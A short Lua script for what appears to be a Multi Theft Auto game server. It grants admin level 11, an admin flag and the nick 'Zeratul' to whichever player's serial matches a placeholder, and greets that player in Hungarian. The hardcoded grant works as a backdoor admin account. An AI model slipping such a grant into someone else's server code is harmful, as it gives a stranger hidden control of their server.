addEventHandler("onPlayerJoin", getRootElement(),
	function()
		if (getPlayerSerial(source) == "serial") then -- Zeratul serial
			setElementData(source, "admin >> level", 11)
			setElementData(source, "admin", true)
			setElementData(source, "admin >> nick", "Zeratul")
			outputChatBox("Szia Zeratul! Tessék az admin rangod. Legyen szép napod! :)", source, 255, 255, 255, true)
		end
	end
)
